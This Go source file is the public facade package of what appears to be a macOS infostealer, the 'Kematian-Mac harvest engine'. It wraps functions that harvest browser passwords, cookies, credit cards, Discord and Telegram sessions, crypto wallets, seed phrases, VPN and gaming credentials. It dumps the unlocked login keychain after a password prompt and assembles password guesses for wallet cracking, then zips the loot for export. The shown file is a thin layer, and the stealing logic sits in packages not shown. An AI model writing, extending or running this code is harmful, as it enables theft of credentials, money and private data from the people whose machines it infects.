// Package recovery is the public façade of the Kematian-Mac harvest engine.
//
// Callers (cmd/kematian) should import this package rather than subpackages
// directly. It re-exports types and thin wrappers over browser decryption,
// disk scanners, and zip helpers so the CLI stays free of internal paths.
//
// Core orchestration lives in collect.go (Collect / extractProfileData).
// Platform-specific setup is in collect_darwin.go (Keychain session).
package recovery

import (
	"recovery/recovery/crypto"
	"recovery/recovery/scanner"
	"recovery/recovery/types"
	"recovery/recovery/ziputil"
)

// Type aliases — keep cmd/kematian free of recovery/types imports.
type CollectOptions = types.CollectOptions
type CollectionResult = types.CollectionResult
type BrowserConfig = types.BrowserConfig
type ProfileInfo = types.ProfileInfo
type ResolvedKeys = types.ResolvedKeys
type PasswordResult = types.PasswordResult
type CookieResult = types.CookieResult
type AutofillResult = types.AutofillResult
type HistoryResult = types.HistoryResult
type BookmarkResult = types.BookmarkResult
type CreditCardResult = types.CreditCardResult
type DiscordTokenResult = types.DiscordTokenResult
type FileResult = types.FileResult
type ExtensionResult = types.ExtensionResult
type WalletResult = types.WalletResult
type TelegramResult = types.TelegramResult
type KeyResult = types.KeyResult
type SeedResult = types.SeedResult
type AppCredentialResult = types.AppCredentialResult
type GamingResult = types.GamingResult
type SteamResult = types.SteamResult
type GameInfo = types.GameInfo
type BattleNetResult = types.BattleNetResult
type EpicResult = types.EpicResult
type RiotResult = types.RiotResult
type UplayResult = types.UplayResult
type VPNResult = types.VPNResult
type NordVPNResult = types.NordVPNResult
type WireGuardResult = types.WireGuardResult
type OpenVPNResult = types.OpenVPNResult
type MullvadResult = types.MullvadResult

// Scanner wrappers -----------------------------------------------------------

func ScanExtensions() []ExtensionResult { return scanner.ScanExtensions() }
func ScanFiles() []FileResult           { return scanner.ScanFiles() }
func ScanWallets() []WalletResult       { return scanner.ScanWallets() }

type WalletExtensionBundle = scanner.WalletExtensionBundle
type WalletExtensionFileEntry = scanner.WalletExtensionFileEntry
type DesktopWalletBundle = scanner.DesktopWalletBundle

// CollectWalletExtensionBundles returns on-disk wallet extension trees for zip export.
func CollectWalletExtensionBundles() []WalletExtensionBundle {
	return scanner.CollectWalletExtensionBundles()
}

// CollectDesktopWalletBundles returns desktop wallet app data directories for zip export.
func CollectDesktopWalletBundles() []DesktopWalletBundle {
	return scanner.CollectDesktopWalletBundles()
}

func ScanTelegram() []TelegramResult { return scanner.ScanTelegram() }

// ZipTelegram packs a Telegram Desktop tdata directory into a zip.
func ZipTelegram(path string) ([]byte, error) {
	return scanner.ZipTelegram(path)
}

func ScanApps() []AppCredentialResult  { return scanner.ScanApps() }
func ScanKeys() []KeyResult             { return scanner.ScanKeys() }
func FetchFile(path string) ([]byte, error) { return scanner.FetchFile(path) }
func ZipDirectory(dir string) ([]byte, error) { return ziputil.ZipDirectory(dir) }

type ZipFileEntry = ziputil.FileEntry

func ZipFileEntries(entries []ZipFileEntry) ([]byte, error) {
	return ziputil.ZipFileEntries(entries)
}

func ZipFileEntriesChunked(entries []ZipFileEntry, maxBytes int) ([][]byte, error) {
	return ziputil.ZipFileEntriesChunked(entries, maxBytes)
}

// ScanSeeds looks for BIP39-like mnemonic phrases in files, passwords, and autofill.
func ScanSeeds(files []FileResult, passwords []PasswordResult, autofill []AutofillResult) []SeedResult {
	return scanner.ScanSeeds(files, passwords, autofill)
}

type PasswordCandidateResult = types.PasswordCandidateResult

// CollectKeychainPasswordCandidates extracts password-like items from the login keychain dump.
func CollectKeychainPasswordCandidates() []PasswordCandidateResult {
	return scanner.CollectKeychainPasswordCandidates()
}

// HarvestLoginKeychain dumps the unlocked login keychain (raw text + password candidates).
// Call after EnsureLoginKeychainUnlocked / password modal so locked keychains are opened first.
func HarvestLoginKeychain() (dump []byte, candidates []PasswordCandidateResult) {
	return scanner.HarvestLoginKeychain()
}

// LoginKeychainWasLocked reports whether unlock-keychain was required this run.
func LoginKeychainWasLocked() bool {
	return crypto.LoginKeychainWasLocked()
}

// BuildPasswordCandidates deduplicates password guesses from browsers + keychain for wallet cracking.
func BuildPasswordCandidates(passwords []PasswordResult, autofill []AutofillResult, keychain []PasswordCandidateResult) []PasswordCandidateResult {
	return scanner.BuildPasswordCandidates(passwords, autofill, keychain)
}

// AppendExtraPasswordCandidates adds secondary guesses derived from the full harvest.
func AppendExtraPasswordCandidates(candidates []PasswordCandidateResult, result *CollectionResult) []PasswordCandidateResult {
	return scanner.AppendExtraPasswordCandidates(candidates, result)
}

// MacLoginPassword returns the password set via crypto.SetMacLoginPassword (if any).
func MacLoginPassword() string {
	return crypto.MacLoginPassword()
}
